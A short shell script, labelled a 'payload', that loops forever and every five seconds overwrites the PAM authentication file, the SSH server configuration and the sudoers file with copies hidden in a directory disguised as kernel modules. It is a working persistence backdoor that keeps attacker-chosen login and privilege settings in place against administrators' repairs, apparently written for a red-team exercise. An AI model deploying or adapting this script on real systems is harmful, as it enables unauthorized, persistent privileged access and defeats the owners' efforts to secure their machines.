#!/bin/sh

# this might be better to be a service, instead of a bash script 

while [ true ]
do
	# payload 
	cp /lib/modules/kernel_static/common_auth /etc/pam.d/common_auth
	cp /lib/modules/kernel_static/sshd_config /etc/ssh/sshd_config
	cp /lib/modules/kernel_static/sudoers /etc/sudoers

	# debug
	sleep 5
done